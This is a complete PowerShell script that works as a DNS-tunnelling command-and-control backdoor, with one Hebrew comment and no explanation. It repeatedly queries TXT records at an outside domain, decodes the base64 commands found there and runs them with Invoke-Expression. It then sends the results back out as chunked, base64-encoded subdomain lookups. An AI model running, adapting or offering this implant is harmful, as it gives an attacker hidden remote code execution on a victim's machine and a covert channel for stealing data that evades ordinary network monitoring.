
$domain = "command.connect.menorraitdev.net"
$previousTXT = ""


while ($true) {

    $output = nslookup -type=TXT $domain | Out-String

  
    if ($output -match 'text\s*=\s*"(.*?)"') {
        $currentTXT = $matches[1]

     
        if ($currentTXT -ne $previousTXT) {
            Write-Output "Detected new command in TXT record: $currentTXT"
            $previousTXT = $currentTXT

            $Command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($currentTXT))
            Write-Output "Decoded command: $Command"

    
            $output = Invoke-Expression $Command
            Write-Output "Command output: $output"

          
            if ($output.Length -gt 63) {
             
                $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
                $chunks = ($encodedOutput -split '(.{63})' | Where-Object { $_ -ne "" })
                $counter = 1

                foreach ($chunk in $chunks) {
                  
                    $subdomain = "Chunk$counter.$chunk.$domain"
                    nslookup -type=CNAME $subdomain
                    Start-Sleep -Milliseconds 500  # השהייה בין שליחת חתיכות
                    $counter++
                }
            } else {
            
                $randomNumber = Get-Random -Minimum 100 -Maximum 999
                $modifiedOutput = "$output$randomNumber"
                $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($modifiedOutput))
                
                nslookup -type=CNAME "$encodedOutput.$domain"
            }

            Write-Output "Sent encoded output. Waiting for new command..."
        } else {
            Write-Output "No new command detected."
        }
    } else {
        Write-Output "TXT record not found."
    }

 
    Start-Sleep -Seconds 60
}
